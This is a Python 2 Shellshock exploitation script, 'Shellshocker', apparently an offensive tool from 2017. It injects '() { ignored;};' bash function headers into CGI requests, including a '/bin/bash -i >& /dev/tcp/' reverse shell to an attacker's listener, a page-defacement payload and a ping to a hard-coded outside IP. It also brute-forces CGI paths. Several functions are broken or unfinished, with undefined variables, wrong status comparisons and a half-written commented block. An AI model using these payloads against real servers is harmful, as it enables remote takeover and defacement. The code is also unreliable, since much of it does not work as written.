import httplib
import time
import sys

target_host = ''
target_port = 80  # Default HTTP port
target_path = ''

Payload_1 = 'echo \'Sh3llsh0ck3d!\' > exploited.txt'
Payload_2 = 'cd /usr/local/apache2/htdocs/ && echo \'<html><body><h1>OMG i got Shellshocked!</h1></body></html>\''
Payload_3 = 'ping 185.143.173.62'
Expl0it = '() { ignored;};'


legit_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Referer": "https://www.google.ru/",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4"}


def banner():
    banner_text = '''\n
   _____ _          _ _     _                _    
  / ____| |        | | |   | |              | |   
 | (___ | |__   ___| | |___| |__   ___   ___| | __
  \___ \| '_ \ / _ \ | / __| '_ \ / _ \ / __| |/ /
  ____) | | | |  __/ | \__ \ | | | (_) | (__|   < 
 |_____/|_| |_|\___|_|_|___/_| |_|\___/ \___|_|\_|
                                                    () { :; };
        checker tool\n
    Created by r4z0r5 for DSEC, 2017

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Usage is so simple even a monkey can handle it:

Shellshocker.py <flag > <target host> <path to target cgi script>

Path to CGI-sctipt is not required if you are using the -b flag

Flags:

b  - Brute force the path to CGI scripts. Using this flag also requires You to point a path to the dictionary (flag d),\nif you dont want to use the default one.
     
     Example : Shellshocker.py b plsleavemealone.com d Desktop/dicts/somedict.txt
h  - Check which header is vulnerable. In this mode tool will check multiple headers for the vulnerability.    
  
     Example : Shellshocker.py h pwnmepls.io /cgi-bin/vulnerable.cgi
t  - Simple Shellshock check.
         
     Example : Shellshcoker.py t shellshock.me /cgi-bin/shockme.cgi     
    
    '''
    print(banner_text)
    return

def Shock(target_host, target_port, target_path, listener):
    reverse_shell = "() { ignored;};/bin/bash -i >& /dev/tcp/%s 0>&1" % listener
    result = False
    malicious_headers = {"Content-type": "application/x-www-form-urlencoded",
                         "test": reverse_shell}

    connection = httplib.HTTPConnection(host=target_host, port=target_port)


    print '\n[*]Sending out a request with malicious headers.'
    print '\n[*]Request method : GET, Request url = ', target_path, '\nHeaders: ', malicious_headers
    req2 = connection.request("GET", url=target_path, headers=malicious_headers)
    response = connection.getresponse()
    if response.status == 200:
        print 'Exploitation seems to be successful, check you\'r listener!'
        result = True
    else:
        print 'There might be an error in server handling our malicious request.'
        result = False

    return result


def Bruteforce_CGIS(target_host,target_port,dictionary_path):
    print 'Running in the Brute-Force mode.'
    brute_headers = {"Content-type": "application/x-www-form-urlencoded",
                     "Connection": "Close"
    }
    result = False
    con = httplib.HTTPConnection(host=target_host, port=target_port)
    if dictionary_path:
        dictionary = open('cgis.txt','r')
    else:
        try:
            dict = open(dictionary_path,'r')
        except IOError:
            print 'No such file.'
            return False
            banner()
    for line in dictionary:
        req = con.request("GET", url=target_path, headers=malicious_headers)
        response = con.getresponse()
        if response == 200:
            print line, response.status,response.reason
        if response == 403:
            print line, response.status,response.reason
        if response == 404:
            print line, 'Not Found'
    return result

def Connection_check(target_host,target_port,target_path,legit_headers):
    result = False
    con = httplib.HTTPConnection(host=target_host,port=target_port)
    req = con.request("GET",url=target_path,headers=legit_headers)
    response = con.getresponse()
    print response.status,response.reason,response.msg
    if response.status == 403:
        print 'Access denied, try different CGI path.'
        time.sleep(5)
        banner()
    if response.status == 404:
        print 'Page does not exist, try different path.'
        time.sleep(5)
        banner()
    if response.status == 400:
        print 'Bad request error.'
        time.sleep(5)
        banner()
    if response.status == 500:
        print 'Congrats, server is dead!'
        time.sleep(5)
        banner()
    if response.status == 200:
        result = True
    return result

"""

A C T U A L   B E G I N N I N G

"""


banner()

flag = sys.argv[1]

if flag == 'b':
    target_host = sys.argv[2]
    if len(sys.argv[3]) != 0:
        dictionary_path = sys.argv[4]
    Bruteforce_CGIS(target_host, target_port, dictionary_path)
if flag == 'h':
    print 'This function is currently developed and not yet avaliable'
    banner()
if flag == 't':
    listener = raw_input('Enter the listener IP (IP/port):')
    if Connection_check(target_host,target_port,target_path,legit_headers):
        print 'Performing simple Shellshock test.'
        Shock(target_host, target_port, target_path, listener)
    else:
        pass
print 'Sys args: ',sys.argv
print 'args length:',len(sys.argv)


"""
print 'Testing connection with',target_host,'Path:',target_path,'Port:',target_port

if Connection_check(target_host, target_port, target_path, legit_headers):
    print '\nConnection stable.'
    if flag == 'b':
        Bruteforce_CGIS(target_host, target_port, dictionary_path)
    if flag == 't':

else:
    print '\nSomething went wrong.....'
    time.sleep(2)
    banner()
"""






    ### Finish the sys.argv, attack selection